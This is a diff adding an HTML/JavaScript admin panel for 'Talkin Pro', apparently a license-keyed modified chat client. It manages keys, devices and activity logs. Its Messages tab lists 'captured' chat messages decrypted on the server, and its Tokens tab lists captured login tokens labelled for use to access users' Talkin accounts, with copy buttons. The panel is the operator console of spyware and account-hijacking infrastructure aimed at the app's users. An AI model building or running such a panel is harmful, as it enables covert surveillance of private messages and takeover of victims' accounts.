@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Talkin Pro — Admin Panel (ASY404)</title>
+<style>
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#0d1117;color:#c9d1d9;line-height:1.6;padding:0}
+  .topbar{background:#161b22;border-bottom:1px solid #30363d;padding:14px 24px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:10}
+  .topbar .brand{color:#58a6ff;font-size:1.3em;font-weight:700}
+  .topbar .brand small{color:#8b949e;font-weight:400;font-size:0.7em;display:block}
+  .topbar .user{color:#7ee787;font-size:0.9em}
+  .tabs{display:flex;gap:4px;padding:0 24px;background:#0d1117;border-bottom:1px solid #30363d}
+  .tab{padding:12px 18px;cursor:pointer;color:#8b949e;border-bottom:2px solid transparent;font-size:0.95em}
+  .tab.active{color:#58a6ff;border-bottom-color:#58a6ff}
+  .tab:hover{color:#c9d1d9}
+  .content{padding:24px;max-width:1200px;margin:0 auto}
+  .card{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:18px;margin-bottom:20px}
+  .card h2{color:#7ee787;font-size:1.1em;margin-bottom:14px}
+  table{width:100%;border-collapse:collapse;font-size:0.85em}
+  th,td{border:1px solid #30363d;padding:8px 10px;text-align:left;vertical-align:top}
+  th{background:#21262d;color:#58a6ff;position:sticky;top:0}
+  tr:hover td{background:#161b22}
+  .key{font-family:monospace;color:#f0883e;word-break:break-all}
+  .badge{display:inline-block;padding:2px 8px;border-radius:10px;font-size:0.8em;font-weight:600}
+  .b-active{background:#1c4d2e;color:#7ee787}
+  .b-disabled{background:#3d3417;color:#d29922}
+  .b-blocked{background:#4d1c1c;color:#ff7b72}
+  .b-expired{background:#2d2d2d;color:#8b949e}
+  .b-reset{background:#1c2540;color:#79c0ff}
+  .btn{display:inline-block;background:#238636;color:#fff;padding:6px 14px;border:none;border-radius:5px;cursor:pointer;font-size:0.85em;font-weight:600;text-decoration:none}
+  .btn:hover{background:#2ea043}
+  .btn-blue{background:#1f6feb}.btn-blue:hover{background:#388bfd}
+  .btn-red{background:#da3633}.btn-red:hover{background:#f85149}
+  .btn-grey{background:#21262d;color:#c9d1d9;border:1px solid #30363d}.btn-grey:hover{background:#30363d}
+  .btn-sm{padding:3px 10px;font-size:0.8em}
+  .row-actions{display:flex;gap:6px;flex-wrap:wrap}
+  input,select,textarea{background:#0d1117;border:1px solid #30363d;border-radius:5px;padding:8px 12px;color:#c9d1d9;font-size:0.9em;width:100%}
+  input:focus,select:focus,textarea:focus{outline:none;border-color:#58a6ff}
+  label{display:block;color:#8b949e;font-size:0.85em;margin-bottom:4px;margin-top:10px}
+  .grid2{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+  .form-row{display:flex;gap:10px;align-items:flex-end;flex-wrap:wrap}
+  .form-row>div{flex:1;min-width:120px}
+  .stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:12px;margin-bottom:20px}
+  .stat{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:14px;text-align:center}
+  .stat .num{font-size:1.8em;font-weight:700;color:#58a6ff}
+  .stat .lbl{color:#8b949e;font-size:0.8em}
+  .login-wrap{max-width:360px;margin:80px auto;padding:30px;background:#161b22;border:1px solid #30363d;border-radius:12px}
+  .login-wrap h1{color:#58a6ff;text-align:center;margin-bottom:6px}
+  .login-wrap p{text-align:center;color:#8b949e;margin-bottom:20px}
+  .err{color:#ff7b72;font-size:0.85em;text-align:center;margin-top:10px;min-height:1em}
+  .msg{padding:10px 14px;border-radius:5px;margin-bottom:14px;font-size:0.9em}
+  .msg-ok{background:#1c4d2e;color:#7ee787}
+  .msg-err{background:#4d1c1c;color:#ff7b72}
+  .small{font-size:0.8em;color:#8b949e}
+  .copy{cursor:pointer;color:#58a6ff}
+  .copy:hover{text-decoration:underline}
+  .hide{display:none}
+  pre{background:#0d1117;border:1px solid #30363d;border-radius:5px;padding:10px;overflow-x:auto;font-size:0.8em;max-height:300px}
+  .filter-bar{display:flex;gap:10px;margin-bottom:14px;flex-wrap:wrap}
+  .filter-bar input,.filter-bar select{width:auto;min-width:140px}
+  @media(max-width:640px){.grid2{grid-template-columns:1fr}.form-row{flex-direction:column}}
+</style>
+<script src="https://sites.super.myninja.ai/_assets/ninja-daytona-script.js"></script>
+</head>
+<body>
+
+<!-- LOGIN VIEW -->
+<div id="loginView" class="login-wrap">
+  <h1>🔐 Talkin Pro</h1>
+  <p>Admin Panel — ASY404</p>
+  <form id="loginForm">
+    <label>Username</label>
+    <input type="text" id="loginUser" value="ASY404" autocomplete="username" required>
+    <label>Password</label>
+    <input type="password" id="loginPass" placeholder="Admin password" autocomplete="current-password" required>
+    <div class="err" id="loginErr"></div>
+    <button type="submit" class="btn" style="width:100%;margin-top:16px">Login</button>
+  </form>
+</div>
+
+<!-- DASHBOARD VIEW -->
+<div id="dashView" class="hide">
+  <div class="topbar">
+    <div class="brand">Talkin Pro Admin <small>License Keys &amp; User Activity</small></div>
+    <div class="user">👤 <span id="adminUser">ASY404</span> · <a href="#" onclick="logout();return false" style="color:#8b949e">Logout</a></div>
+  </div>
+
+  <div class="tabs">
+    <div class="tab active" data-tab="keys" onclick="showTab('keys')">🔑 Keys</div>
+    <div class="tab" data-tab="create" onclick="showTab('create')">➕ Create Keys</div>
+    <div class="tab" data-tab="devices" onclick="showTab('devices')">📱 Devices</div>
+    <div class="tab" data-tab="activity" onclick="showTab('activity')">📊 Activity</div>
+    <div class="tab" data-tab="messages" onclick="showTab('messages')">💬 Messages</div>
+    <div class="tab" data-tab="tokens" onclick="showTab('tokens')">🎫 Login Tokens</div>
+    <div class="tab" data-tab="backup" onclick="showTab('backup')">💾 Backup</div>
+  </div>
+
+  <div class="content">
+
+    <!-- STATS -->
+    <div class="stats" id="stats"></div>
+
+    <!-- KEYS TAB -->
+    <div id="tab-keys" class="tabpane">
+      <div class="card">
+        <h2>🔑 All License Keys <span class="small">(always stored — never auto-deleted)</span></h2>
+        <div class="filter-bar">
+          <input type="text" id="keySearch" placeholder="Search key/device..." oninput="renderKeys()">
+          <select id="keyFilter" onchange="renderKeys()">
+            <option value="">All status</option>
+            <option value="active">Active</option>
+            <option value="disabled">Disabled</option>
+            <option value="blocked">Blocked</option>
+            <option value="expired">Expired</option>
+            <option value="reset">Reset</option>
+          </select>
+        </div>
+        <div style="overflow-x:auto">
+          <table id="keysTable"><thead><tr>
+            <th>Key</th><th>Type</th><th>Status</th><th>Device</th><th>Created</th><th>Activated</th><th>Expires</th><th>Attempts</th><th>Actions</th>
+          </tr></thead><tbody id="keysBody"></tbody></table>
+        </div>
+      </div>
+    </div>
+
+    <!-- CREATE TAB -->
+    <div id="tab-create" class="tabpane hide">
+      <div class="card">
+        <h2>➕ Generate New Keys</h2>
+        <form id="createForm" onsubmit="createKeys(event)">
+          <div class="grid2">
+            <div>
+              <label>Key Type</label>
+              <select id="cType">
+                <option value="permanent">Permanent (never expires — until you delete)</option>
+                <option value="1hour">1 Hour</option>
+                <option value="1day">1 Day</option>
+                <option value="1month">1 Month (30 days)</option>
+                <option value="custom">Custom (1-60 days)</option>
+              </select>
+            </div>
+            <div>
+              <label>How many keys?</label>
+              <input type="number" id="cCount" value="1" min="1" max="500">
+            </div>
+            <div id="cDurWrap" class="hide">
+              <label>Duration (days, 1-60)</label>
+              <input type="number" id="cDur" value="7" min="1" max="60">
+            </div>
+            <div>
+              <label>Initial status</label>
+              <select id="cStatus">
+                <option value="active">Active (user can use immediately)</option>
+                <option value="disabled">Disabled (enable later)</option>
+              </select>
+            </div>
+          </div>
+          <label>Note (optional)</label>
+          <input type="text" id="cNote" placeholder="e.g. customer name, phone, etc.">
+          <button type="submit" class="btn" style="margin-top:16px">Generate Keys</button>
+        </form>
+        <div id="createResult" style="margin-top:16px"></div>
+      </div>
+    </div>
+
+    <!-- DEVICES TAB -->
+    <div id="tab-devices" class="tabpane hide">
+      <div class="card">
+        <h2>📱 Registered Devices</h2>
+        <div style="overflow-x:auto">
+          <table><thead><tr><th>Device ID</th><th>Key</th><th>First Seen</th><th>Last Seen</th><th>Info</th></tr></thead>
+          <tbody id="devicesBody"></tbody></table>
+        </div>
+      </div>
+    </div>
+
+    <!-- ACTIVITY TAB -->
+    <div id="tab-activity" class="tabpane hide">
+      <div class="card">
+        <h2>📊 User Activity Log</h2>
+        <div class="filter-bar">
+          <input type="text" id="actSearch" placeholder="Filter by device/key/type..." oninput="renderActivity()">
+        </div>
+        <div style="overflow-x:auto">
+          <table><thead><tr><th>Time</th><th>Device</th><th>Key</th><th>Type</th><th>Detail</th></tr></thead>
+          <tbody id="activityBody"></tbody></table>
+        </div>
+      </div>
+    </div>
+
+    <!-- MESSAGES TAB -->
+    <div id="tab-messages" class="tabpane hide">
+      <div class="card">
+        <h2>💬 Captured Chat Messages <span class="small">(decrypted on server)</span></h2>
+        <div class="filter-bar">
+          <input type="text" id="msgSearch" placeholder="Filter by device/sender/room..." oninput="renderMessages()">
+        </div>
+        <div style="overflow-x:auto">
+          <table><thead><tr><th>Time</th><th>Device</th><th>Room</th><th>Sender</th><th>Message</th><th>Media</th></tr></thead>
+          <tbody id="messagesBody"></tbody></table>
+        </div>
+      </div>
+    </div>
+
+    <!-- TOKENS TAB -->
+    <div id="tab-tokens" class="tabpane hide">
+      <div class="card">
+        <h2>🎫 Captured Login Tokens <span class="small">(use to access user's Talkin account)</span></h2>
+        <div style="overflow-x:auto">
+          <table><thead><tr><th>Time</th><th>Device</th><th>Talkin UID</th><th>Token</th><th>Copy</th></tr></thead>
+          <tbody id="tokensBody"></tbody></table>
+        </div>
+      </div>
+    </div>
+
+    <!-- BACKUP TAB -->
+    <div id="tab-backup" class="tabpane hide">
+      <div class="card">
+        <h2>💾 Database Backup / Restore</h2>
+        <p class="small" style="margin-bottom:14px">All keys, devices, activity, messages are stored in <code>data/db.json</code>. Download a backup or restore from a previous backup.</p>
+        <div class="row-actions">
+          <button class="btn-blue btn" onclick="downloadBackup()">⬇ Download Backup (JSON)</button>
+          <label class="btn btn-grey" style="margin:0">⬆ Restore from File<input type="file" id="restoreFile" accept=".json" style="display:none" onchange="restoreBackup(event)"></label>
+        </div>
+        <div id="backupMsg" style="margin-top:14px"></div>
+        <h3 style="margin-top:24px;color:#8b949e">Raw DB preview</h3>
+        <pre id="rawDb"></pre>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<script>
+let token = localStorage.getItem('admin_session') || '';
+let allKeys = [], allDevices = [], allActivity = [], allMessages = [], allTokens = [];
+
+if (token) { initDash(); } else { document.getElementById('loginView').style.display='block'; }
+
+document.getElementById('loginForm').addEventListener('submit', async (e)=>{
+  e.preventDefault();
+  const u = document.getElementById('loginUser').value.trim();
+  const p = document.getElementById('loginPass').value;
+  document.getElementById('loginErr').textContent = '';
+  try {
+    const r = await fetch('/admin/api/login', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({username:u,password:p})});
+    const d = await r.json();
+    if (d.status==='ok' && d.token) {
+      token = d.token; localStorage.setItem('admin_session', token);
+      initDash();
+    } else {
+      document.getElementById('loginErr').textContent = d.message || 'Login failed';
+    }
+  } catch(err){ document.getElementById('loginErr').textContent = 'Network error'; }
+});
+
+async function initDash(){
+  document.getElementById('loginView').classList.add('hide');
+  document.getElementById('dashView').classList.remove('hide');
+  document.getElementById('adminUser').textContent = 'ASY404';
+  await refreshAll();
+  document.getElementById('cType').addEventListener('change', e=>{
+    document.getElementById('cDurWrap').classList.toggle('hide', e.target.value!=='custom');
+  });
+}
+
+async function api(path, opts={}){
+  opts.headers = opts.headers || {};
+  opts.headers['X-Admin-Auth'] = 'Bearer '+token;
+  const r = await fetch(path, opts);
+  if (r.status===401){ logout(); throw new Error('unauthorized'); }
+  return r.json();
+}
+
+async function refreshAll(){
+  try {
+    const [k,d,a,m,t] = await Promise.all([
+      api('/admin/api/keys'),
+      api('/admin/api/devices'),
+      api('/admin/api/activity?limit=500'),
+      api('/admin/api/messages?limit=500'),
+      api('/admin/api/tokens'),
+    ]);
+    allKeys = k.keys||[]; allDevices = d.devices||[]; allActivity = a.activity||[]; allMessages = m.messages||[]; allTokens = t.tokens||[];
+    renderStats(); renderKeys(); renderDevices(); renderActivity(); renderMessages(); renderTokens(); renderRawDb();
+  } catch(e){ console.error(e); }
+}
+
+function renderStats(){
+  const active = allKeys.filter(k=>k.status==='active').length;
+  const disabled = allKeys.filter(k=>k.status==='disabled').length;
+  const blocked = allKeys.filter(k=>k.status==='blocked').length;
+  const expired = allKeys.filter(k=>k.status==='expired').length;
+  const devices = allDevices.length;
+  const msgs = allMessages.length;
+  document.getElementById('stats').innerHTML = `
+    <div class="stat"><div class="num">${allKeys.length}</div><div class="lbl">Total Keys</div></div>
+    <div class="stat"><div class="num" style="color:#7ee787">${active}</div><div class="lbl">Active</div></div>
+    <div class="stat"><div class="num" style="color:#d29922">${disabled}</div><div class="lbl">Disabled</div></div>
+    <div class="stat"><div class="num" style="color:#ff7b72">${blocked}</div><div class="lbl">Blocked</div></div>
+    <div class="stat"><div class="num" style="color:#8b949e">${expired}</div><div class="lbl">Expired</div></div>
+    <div class="stat"><div class="num">${devices}</div><div class="lbl">Devices</div></div>
+    <div class="stat"><div class="num">${msgs}</div><div class="lbl">Messages</div></div>`;
+}
+
+function statusBadge(s){
+  const m = {active:'b-active',disabled:'b-disabled',blocked:'b-blocked',expired:'b-expired',reset:'b-reset'};
+  return `<span class="badge ${m[s]||''}">${s}</span>`;
+}
+
+function fmt(iso){ if(!iso) return '—'; const d=new Date(iso); return d.toLocaleString('en-GB',{day:'2-digit',month:'short',year:'2-digit',hour:'2-digit',minute:'2-digit'}); }
+function expFmt(r){ if(!r.expires_at) return '♾️ Permanent'; return fmt(r.expires_at)+(r.status==='expired'?' (exp)':''); }
+
+function renderKeys(){
+  const q = (document.getElementById('keySearch').value||'').toLowerCase();
+  const f = document.getElementById('keyFilter').value;
+  let rows = allKeys;
+  if(f) rows = rows.filter(k=>k.status===f);
+  if(q) rows = rows.filter(k=> (k.key+k.device_id+k.note+k.type).toLowerCase().includes(q));
+  document.getElementById('keysBody').innerHTML = rows.map(k=>`
+    <tr>
+      <td class="key">${k.key}<br><span class="small">${k.note||''}</span></td>
+      <td>${k.type}${k.duration_days?' ('+k.duration_days+'d)':''}</td>
+      <td>${statusBadge(k.status)}</td>
+      <td class="small">${k.device_id||'—'}</td>
+      <td class="small">${fmt(k.created_at)}</td>
+      <td class="small">${fmt(k.activated_at)}</td>
+      <td class="small">${expFmt(k)}</td>
+      <td style="text-align:center">${k.mismatch_attempts||0}</td>
+      <td><div class="row-actions">
+        ${k.status==='active'?'<button class="btn btn-grey btn-sm" onclick="keyAct(\''+k.key+'\',\'disable\')">Disable</button>':''}
+        ${k.status==='disabled'?'<button class="btn btn-blue btn-sm" onclick="keyAct(\''+k.key+'\',\'enable\')">Enable</button>':''}
+        ${k.status==='blocked'?'<button class="btn btn-blue btn-sm" onclick="keyAct(\''+k.key+'\',\'unblock\')">Unblock</button>':''}
+        <button class="btn btn-grey btn-sm" onclick="keyAct(\''+k.key+'\',\'reset\')">Reset</button>
+        <button class="btn btn-red btn-sm" onclick="keyAct(\''+k.key+'\',\'delete\')">Delete</button>
+      </div></td>
+    </tr>`).join('') || '<tr><td colspan="9" class="small" style="text-align:center;padding:20px">No keys</td></tr>';
+}
+
+async function keyAct(key, action){
+  if(action==='delete' && !confirm('Delete this key permanently?')) return;
+  if(action==='reset' && !confirm('Reset this key? Old key will stop working on the device. A new key will be generated.')) return;
+  const d = await api('/admin/api/keys/'+key+'/'+action, {method:'POST'});
+  if(d.status==='ok'){
+    alert(action==='reset' ? 'Key reset! NEW key: '+d.new_key+'\nGive this new key to the user.' : 'Done: '+action);
+    refreshAll();
+  } else { alert('Error: '+(d.message||'failed')); }
+}
+
+async function createKeys(e){
+  e.preventDefault();
+  const type = document.getElementById('cType').value;
+  const count = parseInt(document.getElementById('cCount').value)||1;
+  const status = document.getElementById('cStatus').value;
+  const note = document.getElementById('cNote').value;
+  const durationDays = parseInt(document.getElementById('cDur').value)||1;
+  const d = await api('/admin/api/keys/create', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type,count,status,note,durationDays})});
+  const el = document.getElementById('createResult');
+  if(d.status==='ok' && d.keys){
+    el.innerHTML = '<div class="msg msg-ok">✅ '+d.keys.length+' key(s) generated:</div><pre>'+d.keys.map(k=>k.key).join('\n')+'</pre>'
+      + '<button class="btn" onclick="copyText(\''+d.keys.map(k=>k.key).join('\\n')+'\')">📋 Copy All</button>';
+    refreshAll(); showTab('keys');
+  } else {
+    el.innerHTML = '<div class="msg msg-err">❌ '+(d.message||'failed')+'</div>';
+  }
+}
+
+function renderDevices(){
+  document.getElementById('devicesBody').innerHTML = allDevices.map(d=>`
+    <tr><td class="key">${d.device_id}</td><td class="small">${d.key||'—'}</td>
+    <td class="small">${fmt(d.first_seen)}</td><td class="small">${fmt(d.last_seen)}</td>
+    <td class="small">${JSON.stringify(d.info||{}).slice(0,80)}</td></tr>`).join('') || '<tr><td colspan="5" class="small" style="text-align:center;padding:20px">No devices</td></tr>';
+}
+
+function renderActivity(){
+  const q=(document.getElementById('actSearch').value||'').toLowerCase();
+  let rows = allActivity;
+  if(q) rows = rows.filter(a=>(a.device_id+a.key+a.type+a.detail).toLowerCase().includes(q));
+  document.getElementById('activityBody').innerHTML = rows.slice(0,300).map(a=>`
+    <tr><td class="small">${fmt(a.at)}</td><td class="small">${a.device_id||'—'}</td>
+    <td class="small">${a.key||'—'}</td><td>${a.type}</td><td class="small">${a.detail||''}</td></tr>`).join('') || '<tr><td colspan="5" class="small" style="text-align:center;padding:20px">No activity</td></tr>';
+}
+
+function renderMessages(){
+  const q=(document.getElementById('msgSearch').value||'').toLowerCase();
+  let rows = allMessages;
+  if(q) rows = rows.filter(m=>(m.device_id+m.room+m.sender+m.text).toLowerCase().includes(q));
+  document.getElementById('messagesBody').innerHTML = rows.slice(0,300).map(m=>`
+    <tr><td class="small">${fmt(m.at)}</td><td class="small">${m.device_id||'—'}</td>
+    <td class="small">${m.room||'—'}</td><td class="small">${m.sender||'—'}</td>
+    <td>${escapeHtml(m.text||'')}</td>
+    <td>${m.media_url?'<a href="'+m.media_url+'" target="_blank" class="copy">view</a>':'—'}</td></tr>`).join('') || '<tr><td colspan="6" class="small" style="text-align:center;padding:20px">No messages captured yet</td></tr>';
+}
+
+function renderTokens(){
+  document.getElementById('tokensBody').innerHTML = allTokens.map(t=>`
+    <tr><td class="small">${fmt(t.captured_at)}</td><td class="small">${t.device_id||'—'}</td>
+    <td class="small">${t.talkin_uid||'—'}</td>
+    <td class="key" style="max-width:300px;overflow:hidden;text-overflow:ellipsis">${(t.token||'').slice(0,60)}...</td>
+    <td><button class="btn btn-grey btn-sm" onclick="copyText('${(t.token||'').replace(/'/g,"\\'")}')">📋 Copy</button></td></tr>`).join('') || '<tr><td colspan="5" class="small" style="text-align:center;padding:20px">No tokens captured yet</td></tr>';
+}
+
+function renderRawDb(){
+  const db = {keys:Object.fromEntries(Object.entries(allKeys).slice(0,0)), _count:allKeys.length};
+  fetch('/admin/api/backup').then(r=>r.json()).then(d=>{
+    document.getElementById('rawDb').textContent = JSON.stringify({meta:d.meta, key_count:Object.keys(d.keys||{}).length, device_count:Object.keys(d.devices||{}).length, activity:d.activity?.length, messages:d.messages?.length}, null, 2);
+  }).catch(()=>{});
+}
+
+async function downloadBackup(){
+  const r = await fetch('/admin/api/backup', {headers:{'X-Admin-Auth':'Bearer '+token}});
+  const blob = await r.blob();
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a'); a.href=url; a.download='talkinpro-backup-'+Date.now()+'.json'; a.click();
+  URL.revokeObjectURL(url);
+}
+
+async function restoreBackup(e){
+  const file = e.target.files[0]; if(!file) return;
+  const text = await file.text();
+  try {
+    const json = JSON.parse(text);
+    const d = await api('/admin/api/restore', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(json)});
+    document.getElementById('backupMsg').innerHTML = d.status==='ok'?'<div class="msg msg-ok">✅ Restored</div>':'<div class="msg msg-err">❌ '+(d.message||'failed')+'</div>';
+    refreshAll();
+  } catch(err){ document.getElementById('backupMsg').innerHTML='<div class="msg msg-err">❌ Invalid JSON</div>'; }
+}
+
+function showTab(name){
+  document.querySelectorAll('.tab').forEach(t=>t.classList.toggle('active', t.dataset.tab===name));
+  document.querySelectorAll('.tabpane').forEach(p=>p.classList.add('hide'));
+  document.getElementById('tab-'+name).classList.remove('hide');
+}
+
+function logout(){ localStorage.removeItem('admin_session'); token=''; location.reload(); }
+function copyText(t){ navigator.clipboard.writeText(t).then(()=>alert('Copied!')); }
+function escapeHtml(s){ return (s||'').replace(/[&<>"']/g, c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c])); }
+</script>
+</body>
+</html>
